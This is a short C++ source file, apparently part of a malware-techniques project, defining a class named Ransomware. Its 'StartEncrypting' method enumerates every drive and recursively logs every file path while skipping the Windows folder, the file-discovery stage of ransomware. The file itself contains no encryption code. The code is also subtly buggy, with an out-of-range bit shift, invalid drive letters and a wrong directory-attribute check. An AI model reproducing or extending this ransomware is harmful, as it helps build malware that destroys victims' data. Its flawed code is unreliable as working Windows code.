#include "ransomware.h"
#include "../MalwareTechniques/ntdll.h"
#include "../Logger/logger.h"

#include <iostream>
#include <string_view>

#include <Windows.h>
#include <string>

namespace maltech {

    namespace ransom {

        Ransomware::Ransomware(ntdll::NtDll& ntdll)
            : ntdll_(ntdll)
        {
        }

        void Ransomware::StartEncrypting() {
            DWORD drivers = GetLogicalDrives();
            const int bits_in_byte = 8;
            const int dword_bits_size = sizeof(DWORD) * bits_in_byte;
            for (DWORD i = 0; i <= dword_bits_size; ++i) {
                DWORD bit_checker = 1;
                if ((bit_checker << (dword_bits_size - i)) & drivers) {
                    char disk = 'A' + (dword_bits_size - i);
                    std::string path;
                    path += disk;
                    path += ":\\*";
                    PrintCatalogue(path);
                }
            }
        }

        void Ransomware::PrintCatalogue(std::string_view path) {
            WIN32_FIND_DATA data{ 0 };
            HANDLE hDirEntry = FindFirstFileA(path.data(), &data);
            if (!hDirEntry || hDirEntry == INVALID_HANDLE_VALUE) {
                LOG_ERROR(std::to_string(GetLastError()));
                return;
            }

            do {
                if (std::string(data.cFileName) == ".." 
                    || std::string(data.cFileName) == "."
                    || std::string(data.cFileName) == "Windows") {
                    continue;
                }
                LOG_INFO(std::string(path.substr(0, path.size() - 1)) + data.cFileName);
                if (data.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY) {
                    PrintCatalogue(
                        std::string(path.substr(0, path.size() - 1))
                        + data.cFileName + "\\*");
                }
            } while (FindNextFileA(hDirEntry, &data));
            FindClose(hDirEntry);
        }
        
    }

}